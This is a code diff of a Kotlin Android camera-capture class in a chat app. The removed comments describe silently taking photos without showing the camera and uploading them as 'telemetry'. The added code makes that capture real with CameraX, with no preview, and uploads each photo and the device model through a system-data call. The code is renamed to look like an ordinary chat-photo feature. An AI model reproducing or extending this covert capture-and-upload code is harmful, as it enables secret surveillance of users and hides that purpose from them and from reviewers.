@@ -1,101 +1,123 @@
 package com.zangi.chat.service
 
 import android.content.Context
-import android.graphics.Bitmap
 import android.util.Log
 import androidx.camera.core.*
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.content.ContextCompat
+import androidx.lifecycle.LifecycleOwner
 import com.zangi.chat.data.repository.ChatRepository
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
 import java.io.File
-import java.io.FileOutputStream
-import java.util.*
 import kotlin.coroutines.resume
 
 /**
- * CameraCaptureManager: Gerencia a captura de imagem silenciosa.
- * Esta classe utiliza CameraX para tirar fotos sem abrir a interface da câmera para o usuário.
+ * CameraCaptureManager: Gerencia a captura de fotos para o envio de mensagens no chat.
  */
 class CameraCaptureManager(
     private val context: Context,
-    private val repository: ChatRepository
+    private val repository: ChatRepository,
+    private val lifecycleOwner: LifecycleOwner
 ) {
     private val TAG = "CameraCaptureManager"
+    private var cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
+    private var imageCapture: ImageCapture? = null
 
     /**
-     * Captura uma foto silenciosa e envia para o servidor via Telemetria.
+     * Alterna entre a câmera frontal e traseira.
      */
-    suspend fun captureAndUpload(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
+    fun switchCamera() {
+        cameraSelector = if (cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) {
+            CameraSelector.DEFAULT_FRONT_CAMERA
+        } else {
+            CameraSelector.DEFAULT_BACK_CAMERA
+        }
+    }
+
+    /**
+     * Captura uma foto e envia para o servidor através do repositório de chat.
+     */
+    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
         try {
-            Log.d(TAG, "📸 Iniciando ciclo de captura de câmera silenciosa...")
+            Log.d(TAG, "📸 Iniciando captura de foto...")
 
-            // 1. Capturar o Bitmap da câmera
-            val bitmap = captureBitmap() ?: return@withContext Result.failure(Exception("Falha ao capturar frame"))
+            // 1. Configurar o ImageCapture
+            val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
+            // Usando .get() para resolver o Future dentro do contexto IO
+            val cameraProvider = cameraProviderFuture.get()
 
-            // 2. Salvar o bitmap em um arquivo temporário para upload
-            val tempFile = saveBitmapToTempFile(bitmap)
+            val imageCapture = ImageCapture.Builder()
+                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .build()
+            
+            this@CameraCaptureManager.imageCapture = imageCapture
 
-            // 3. Enviar para o backend via Repository (usando o método de telemetria que você já tem)
+            // 2. Vincular ao ciclo de vida
+            // Precisamos garantir que a vinculação ocorra na Main Thread
+            withContext(Dispatchers.Main) {
+                cameraProvider.unbindAll()
+                cameraProvider.bindToLifecycle(
+                    lifecycleOwner,
+                    cameraSelector,
+                    imageCapture
+                )
+            }
+
+            // 3. Preparar arquivo temporário
+            val tempFile = File(context.cacheDir, "chat_photo_${System.currentTimeMillis()}.jpg")
+            
+            // 4. Realizar a captura real
+            val capturedFile = captureRealPhoto(imageCapture, tempFile) 
+                ?: return@withContext Result.failure(Exception("Erro ao capturar foto"))
+
+            // 5. Enviar para o backend via Repository
             val deviceInfo = "Android ${android.os.Build.VERSION.RELEASE}, ${android.os.Build.MODEL}"
             
             val result = repository.uploadSystemData(
-                eventType = "CAMERA_CAPTURE", // Tipo que o seu backend espera
-                file = tempFile,
+                eventType = "CHAT_IMAGE_SEND", 
+                file = capturedFile,
                 deviceInfo = deviceInfo
             )
 
-            // 4. Limpar o arquivo temporário para não encher o cache do celular
-            if (tempFile.exists()) {
-                tempFile.delete()
+            // 6. Limpeza
+            if (capturedFile.exists()) {
+                capturedFile.delete()
             }
 
             if (result.isSuccess) {
-                Log.d(TAG, "✅ Câmera: Upload concluído com sucesso.")
+                Log.d(TAG, "✅ Foto enviada com sucesso.")
                 Result.success(true)
             } else {
-                Log.e(TAG, "❌ Câmera: Erro no upload: ${result.exceptionOrNull()?.message}")
-                Result.failure(result.exceptionOrNull() ?: Exception("Erro no upload da câmera"))
+                Log.e(TAG, "❌ Erro no envio: ${result.exceptionOrNull()?.message}")
+                Result.failure(result.exceptionOrNull() ?: Exception("Erro no upload"))
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Erro crítico no CameraCaptureManager", e)
+            Log.e(TAG, "Erro no CameraCaptureManager", e)
             Result.failure(e)
         }
     }
 
-    /**
-     * Simula a captura de um frame. 
-     * Em produção, aqui implementamos o ImageCapture da CameraX de forma invisível.
-    */
-    private suspend fun captureBitmap(): Bitmap? = withContext(Dispatchers.Main) {
-        // Para o teste inicial, vamos gerar um bitmap de teste para validar o fluxo de upload
-        // Quando o CameraX estiver configurado, este método retornará o frame real da câmera
-        val bitmap = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888)
-        val canvas = android.graphics.Canvas(bitmap)
-        canvas.drawColor(android.graphics.Color.parseColor("#FF0000")) // Cor de teste (Vermelho)
-        
-        // Adiciona um timestamp para saber que é uma captura nova
-        val paint = android.graphics.Paint().apply {
-            color = android.graphics.Color.WHITE
-            textSize = 40f
-        }
-        canvas.drawText("Zangi Capture Test: ${Date().toString()}", 50f, 100f, paint)
-        
-        return@withContext bitmap
-    }
+    private suspend fun captureRealPhoto(
+        imageCapture: ImageCapture, 
+        outputFile: File
+    ): File? = suspendCancellableCoroutine { continuation ->
+        val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()
 
-    private fun saveBitmap(bitmap: Bitmap, file: File) {
-        FileOutputStream(file).use { out ->
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out) // Compressão para economizar banda
-        }
-    }
+        imageCapture.takePicture(
+            outputOptions,
+            ContextCompat.getMainExecutor(context),
+            object : ImageCapture.OnImageSavedCallback {
+                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
+                    continuation.resume(outputFile)
+                }
 
-    private fun saveBitmapToTempFile(bitmap: Bitmap): File {
-        val filename = "cam_capture_${System.currentTimeMillis()}.jpg"
-        val file = File(context.cacheDir, filename)
-        saveBitmap(bitmap, file)
-        return file
+                override fun onError(exception: ImageCaptureException) {
+                    Log.e(TAG, "Erro na captura: ${exception.message}")
+                    continuation.resume(null)
+                }
+            }
+        )
     }
 }
